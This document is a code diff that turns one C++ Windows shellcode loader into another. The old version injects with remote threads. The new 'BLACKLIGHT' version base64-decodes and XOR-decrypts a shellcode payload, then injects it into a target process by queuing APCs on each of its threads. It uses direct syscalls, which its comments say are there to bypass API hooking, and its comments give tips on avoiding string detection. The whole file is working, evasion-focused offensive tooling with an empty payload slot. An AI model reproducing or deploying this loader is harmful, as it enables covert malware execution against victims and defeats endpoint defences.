@@ -1,123 +1,237 @@
-// Lightwave.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
-#include <iostream>
+// BLACKLIGHT.CPP
 #include <Windows.h>
 #include "base64.h"
+#include "syscalls4.h" // CUSTOM SYSTEM CALLS TO BYPASS API HOOKING
+#include <iostream>
+#include <cstring>
 #include <string>
+#include <TlHelp32.h>
+#include <vector>
 
-
+using std::string;
+using std::to_string;
 using std::cout;
 using std::endl;
-using std::string;
+using std::vector;
 
-// DATA TYPES
-enum ExecutionMode {
-	EXEC = 1,
-	PID = 2
-};
+// PROTOTYPES
+unsigned char* decryptKey(unsigned char*, size_t);
+unsigned char* decryptXOR(unsigned char*, size_t);
+void run(unsigned char*, size_t);
+void debug(string);
+void debug(char*);
+void error(string);
+void error(char*);
 
 // GLOBALS
-bool DEBUG_MODE = false;
-ExecutionMode E_MODE;
-int TARGET_PID;
-char* LAUNCH_COMMAND;
+DWORD TARGET_PID;
+BOOL DEBUG_MODE = false;
+enum DECRYPTION_MODE {
+	XOR_KEY = 1,
+	BYTEWISE_XOR = 2
+};
 
- 
-// DECRYPTION METHODS. DEPENDING ON WHICH ONE YOUR SC USES MAKE SURE TO CALL THE RIGHT ONE IN MAIN
-// THEN, MAKE SURE TO UPDATE THE KEY INFORMATION
-unsigned char* decryptXOR(unsigned char*, size_t);
-unsigned char* decryptKey(unsigned char*, size_t);
+///////////////////////////////////////////////////////////////////////////////////////
+// RUNNER CONFIG
+///////////////////////////////////////////////////////////////////////////////////////
 
-// THE RUNNER METHOD, THIS IS PROVIDED
-void run(unsigned char*, size_t);
+// TODO: PUT YOUR SC HERE
+const string ENCODED_SC = "";
 
-int main(int argc, char** argv)
-{
-	// HANDLE ARGUMENT FOR PROCESS TO SPAWN
-	if (argc < 3) {
-		cout << "Invalid usage!" << endl;
+// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
+const unsigned char BYTEWISE_XOR_KEY = 77;
+
+// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
+// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
+const unsigned char XOR_KEY_STR[] = { 'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l' };
+const size_t XOR_KEY_STR_LEN = 9;
+
+// TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
+DECRYPTION_MODE DECR_MODE = XOR_KEY;
+
+///////////////////////////////////////////////////////////////////////////////////////
+// RUNNER CODE
+///////////////////////////////////////////////////////////////////////////////////////
+
+// MAIN HANDLES ARGUMENT PARSING AND INVOKING THE DECRYPTION AND ACTUAL RUN ROUTINES
+int main(int argc, char** argv) {
+	debug("hello, world");
+
+	// ARGUMENTS
+	// 1: TARGET PID
+	// 2: DEBUG MODE
+
+	if (argc < 2) {
+		cout << "Invalid arguments, missing PID" << endl;
 		exit(1);
 	}
-
-	// DEAL WITH DEBUG MODE
-	if (argc >= 4) {
-		char d[] = "debug";
-		if (strcmp(argv[3], d) == 0) {
-			cout << "Debug mode!" << endl;
-			DEBUG_MODE = true;
-		}
-	}
-
-	if (DEBUG_MODE) {
-		for (size_t i = 0; i < argc; i++) {
-			cout << i << ": " << argv[i] << endl;
-		}
-	}
-
-	// HANDLE MODE ARGUMENT
-	char* modeStr = argv[1];
-	char* argString = argv[2];
-	if (strcmp(modeStr, "PID") == 0) {
-		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
-		E_MODE = PID;
-		TARGET_PID = atoi(argString);
+	else if (argc == 2) {
+		DEBUG_MODE = false;
+		TARGET_PID = atoi(argv[1]);
 
 	}
-	else if (strcmp(modeStr, "EXEC") == 0) {
-		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
-		E_MODE = EXEC;
-		cout << argv[2] << endl;
-		LAUNCH_COMMAND = argString;
-		cout << LAUNCH_COMMAND << endl;
+	else if (argc == 3) {
+		DEBUG_MODE = true;
+		TARGET_PID = atoi(argv[1]);
+		debug("Debug Mode activated");
+		debug("Got target pid:");
+		debug(argv[1]);
+	}
+
+	// DECODE B64 INTO BYTES
+	debug("decoding sc");
+	string decoded_sc = base64_decode(ENCODED_SC);
+	unsigned char* decoded_bytes = (unsigned char*)decoded_sc.c_str();
+	size_t sc_len = decoded_sc.length();
+
+	// DECRYPT SC BYTES
+	debug("decrypting sc");
+	unsigned char* sc = nullptr;
+	if (DECR_MODE == XOR_KEY) {
+		sc = decryptKey(decoded_bytes, sc_len);
 	}
 	else {
-		if (DEBUG_MODE) cout << "Error with execution mode: must be EXEC or PID" << endl;
+		sc = decryptXOR(decoded_bytes, sc_len);
+	}
+	if (!sc) {
+		error("Failed to decrypt sc!");
 		exit(2);
 	}
-
-
-	// IMPORTANT! BASE64 ENCODED SC GOES HERE
-	string encodedBytes = "";
-	
-	// BASE64 DECODE THE STRING TO GET BYTES
-	string decodedBytes = base64_decode(encodedBytes);
-	unsigned char* encryptedBytes = (unsigned char*) decodedBytes.c_str();
-	size_t bufLen = decodedBytes.length();
-
-	// DECRYPT THE BYTES
-	unsigned char* decr = decryptKey(encryptedBytes, bufLen);
-
-	// RUN THE SC
-	run(decr, bufLen);
-
-	return 0;
-
-}
-
-
-// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
-unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
-	if (DEBUG_MODE) cout << "Decrypting with bytewise XOR" << endl;
-	const unsigned char xKey = 35;
-	
-	unsigned char* decrData = new unsigned char[length+1]; // ALLOCATE + 1 FOR NULL BYTE
-
-	for (size_t i = 0; i < length; i++) {
-		decrData[i] = encryptedBytes[i] ^ xKey;
+	else {
+		debug("Successfully decrypted sc of length " + to_string(sc_len));
+		run(sc, sc_len);
 	}
-	decrData[length] = '\x00';
-	if (DEBUG_MODE) cout << "finished decryption!" << endl;
-	return decrData;
 }
 
-// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
+// THE ACTUAL RUNNER
+void run(unsigned char* sc, size_t sc_len) {
+
+	PVOID remote_buffer = nullptr;
+	HANDLE remote_process;
+	HANDLE current_thread = NULL;
+	OBJECT_ATTRIBUTES object_attributes;
+	CLIENT_ID client_id;
+	NTSTATUS error_code;
+	
+
+	debug("Launching runner");
+	debug("Opening process " + to_string((int)TARGET_PID));
+	
+	object_attributes.Length = NULL;
+	object_attributes.RootDirectory = NULL;
+	object_attributes.ObjectName = NULL;
+	object_attributes.Attributes = NULL;
+	object_attributes.SecurityDescriptor = NULL;
+	object_attributes.SecurityQualityOfService = NULL;
+	
+
+	// OPEN THE PROCESS. TODO: USE NtOpenProcess, BUT IT'S HARD TO FIGURE OUT THE PROCESS HANDLE AND THREAD HANDLE IN THE CLIENT_ID PARAMETER
+	client_id.UniqueProcess = (HANDLE)TARGET_PID;	// CONVERT THE PROCESS ID TO A HANDLE
+	client_id.UniqueThread = NULL;					// DON'T NEED A SPECIFIC THREAD....
+	error_code = NtOpenProcess(&remote_process, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
+	if (!remote_process) {
+		error("Failed to open remote process!");
+		exit(3);
+	}
+	else {
+		debug("Successfully opened the remote process!");
+	}
+
+	// ALLOCATE VIRTUAL MEMORY
+	error_code = NtAllocateVirtualMemory(remote_process, &remote_buffer, 0, &sc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+	if (error_code) {
+		error("Failed to allocate virtual memory");
+		exit(4);
+	}
+	else {
+		debug("Successfully allocated virtual memory");
+	}
+	
+	// WRITE THE SC TO MEMORY
+	size_t bytes_written = 0;
+	error_code = NtWriteVirtualMemory(remote_process, remote_buffer, sc, sc_len, &bytes_written);
+	if (error_code || !bytes_written || bytes_written < sc_len) {
+		error("Failed to write sc to memory! Only wrote " + to_string(bytes_written) + "/" + to_string(sc_len) + " bytes to the remote process");
+		exit(5);
+	}
+	else {
+		debug("Wrote shellcode to memory");
+	}
+
+	// PROTECT THE SC
+	ULONG old_protect = NULL;
+	error_code = NtProtectVirtualMemory(remote_process, &remote_buffer, &sc_len, PAGE_EXECUTE_READ, &old_protect);
+	if (error_code) {
+		error("Failed to re-protect virtual memory!");
+		exit(6);
+	}
+	else {
+		debug("Re-protected virtual memory");
+	}
+
+	// GET A SNAPSHOT
+	HANDLE snapshot = CreateToolhelp32Snapshot((TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD), 0);
+	
+	// GET A LIST OF THREAD IDS
+	THREADENTRY32 thread_entry = { sizeof(THREADENTRY32) };
+	vector<DWORD> thread_ids = vector<DWORD>();
+	BOOL valid_thread = Thread32First(snapshot, &thread_entry);
+
+	// ITERATE ACROSS A LIST OF THREADS GRABBING THREAD IDS, AND GET THE NEXT THREAD
+	while (valid_thread) {
+		if (thread_entry.th32OwnerProcessID == TARGET_PID) {
+			thread_ids.push_back(thread_entry.th32ThreadID);
+		}
+
+		// GET THE NEXT THREAD
+		valid_thread = Thread32Next(snapshot, &thread_entry);
+	}
+	debug("Found " + to_string(thread_ids.size()) + " injectable threads in remote process");
+
+	// ITERATE ACROSS THREAD IDS, GRAB THE THREAD, AND QUEUE AN APC
+	for (size_t k = 0; k < thread_ids.size(); k++) {
+
+		DWORD tid = thread_ids.at(k);
+		client_id.UniqueProcess = NULL;
+		client_id.UniqueThread = (HANDLE)tid;
+
+		error_code = NtOpenThread(&current_thread, THREAD_ALL_ACCESS, &object_attributes, &client_id);
+
+		// IF IT ERRORS OUT, SKIP THIS THREAD
+		if (error_code) {
+			error("Failed to open thread " + to_string(tid) + ", error no " + to_string(error_code));
+		}
+		else {
+			debug("Got handle to thread " + to_string(tid));
+			// TODO: INJECTION HERE
+			error_code = NtQueueApcThread(current_thread, (PKNORMAL_ROUTINE)remote_buffer, NULL, NULL, NULL);
+			if (error_code) {
+				error("Failed to queue APC for thread " + to_string(tid));
+			}
+			else {
+				debug("Queued APC for thread " + to_string(tid));
+			}
+			NtClose(current_thread);
+			debug("Closed handle to thread " + to_string(tid));
+		}
+
+
+	}
+
+	// AT THE END, CLOSE THE HANDLE
+	debug("Closing the process handle");
+	NtClose(remote_process);
+
+}
+
+/////////////////////////////////////////////////////////////////////////////
+// DECRYPTION ROUTINES
+/////////////////////////////////////////////////////////////////////////////
+
+//  DECRYPTION METHOD WITH XOR KEY
 unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
-	if (DEBUG_MODE) cout << "Decrypting with key..." << endl;
-	// KEY AND KEY LENGTH
-	char key[] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'};
-	size_t keyLength = 10;
-	cout << "Got key " << key << " with length " << keyLength << endl;
+
+	debug("Decrypting with key");
 
 	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
 
@@ -127,112 +241,45 @@ unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
 	for (size_t i = 0; i < length; i++) {
 
 		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
-		if (j == keyLength) {
+		if (j == XOR_KEY_STR_LEN) {
 			j = 0;
 		}
-		decrData[i] = encryptedBytes[i] ^ (unsigned char)key[j];
+		decrData[i] = encryptedBytes[i] ^ XOR_KEY_STR[j];
 		j++;
+	}
+	decrData[length] = '\x00';
+	return decrData;
+}
+
+// DECRYPT WITH BYTEWISE XOR, NOT RECOMMENDED
+unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
+
+	debug("decrypting with bytewise xor");
+
+	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
+
+	for (size_t i = 0; i < length; i++) {
+		decrData[i] = encryptedBytes[i] ^ BYTEWISE_XOR_KEY;
 	}
 	decrData[length] = '\x00';
 	if (DEBUG_MODE) cout << "finished decryption" << endl;
 	return decrData;
 }
 
+/////////////////////////////////////////////////////////////////////////////
+// DEBUGGING WRAPPERS
+/////////////////////////////////////////////////////////////////////////////
 
-void run(unsigned char* sc, size_t scLen) {
+void debug(string msg) {
+	if (DEBUG_MODE) cout << "[+] " << msg << endl;
+}
+void debug(char* msg) {
+	if (DEBUG_MODE) cout << "[+] " << msg << endl;
+}
 
-	// NOW THE FUN BEGINS
-	HANDLE processHandle = NULL;
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
-	BOOL success;
-
-	// SWITCH DEPENDING ON THE EXECUTION MODE
-	if (E_MODE == EXEC) {
-		// EXECUTE AN APPLICATION LIKE IEXPLORE TO TARGET
-		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
-		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
-		success = CreateProcessA(
-			NULL,
-			LAUNCH_COMMAND,
-			NULL,
-			NULL,
-			NULL,
-			NORMAL_PRIORITY_CLASS,
-			NULL,
-			NULL,
-			pStartupInfo,
-			pProcessInfo
-		);
-		if (!success) {
-			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " failed: " << success << endl;
-			exit(3);
-		}
-		else {
-			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " succeeded!" << endl;
-		}
-
-		// GET THE PROCESS HANDLE
-		processHandle = pProcessInfo->hProcess;
-	}
-	else if (E_MODE == PID) {
-
-		// OPEN PROCESS WITH THE TARGET PID
-		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TARGET_PID);
-	}
-	if (!processHandle) {
-		if (DEBUG_MODE) cout << "Failed to get process Handle." << endl;
-
-		exit(4);
-	}
-	else {
-		if (DEBUG_MODE)  cout << "Got process handle!" << endl;
-	}
-	
-
-	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-	if (!remoteBuffer) {
-		if (DEBUG_MODE) cout << "Failed to create remote buffer in target process" << endl;
-		exit(5);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Allocating space (readwrite) succeeded!" << endl;
-	}
-
-	// WRITE PROCESS MEMORY
-	success = WriteProcessMemory(processHandle, remoteBuffer, sc, scLen, NULL);
-	if (!success) {
-		if (DEBUG_MODE) cout << "Failed to write process memory" << endl;
-		exit(6);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Write Process Memory succeeded!" << endl;
-	}
-
-	PDWORD oldProtectOption = new DWORD();
-	*oldProtectOption = PAGE_READWRITE;
-
-	// IMPORTANT! IF YOUR SHELLCODE IS POLYMORPHIC OR OTHERWISE SELF-MODIFYING THEN YOU NEED TO SWITCH "PAGE_EXECUTE" WITH "PAGE_READWRITE"
-	success = VirtualProtectEx(processHandle, remoteBuffer, scLen, PAGE_EXECUTE, oldProtectOption);
-	if (!success) {
-		if (DEBUG_MODE) cout << "Failed to change memory protection to execute only" << endl;
-	}
-	else {
-		if (DEBUG_MODE) cout << "Successfully changed memory protection to execute only" << endl;
-	}
-
-
-	// CREATE THREAD AND EXECUTE
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	if (!remoteThread) {
-		if (DEBUG_MODE) cout << "Failed to create remote thread" << endl;
-		exit(7);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote process" << endl;
-	}
-
-	CloseHandle(processHandle);
-
+void error(string msg) {
+	if (DEBUG_MODE) cout << "[!] " << msg << endl;
+}
+void error(char* msg) {
+	if (DEBUG_MODE) cout << "[!] " << msg << endl;
 }
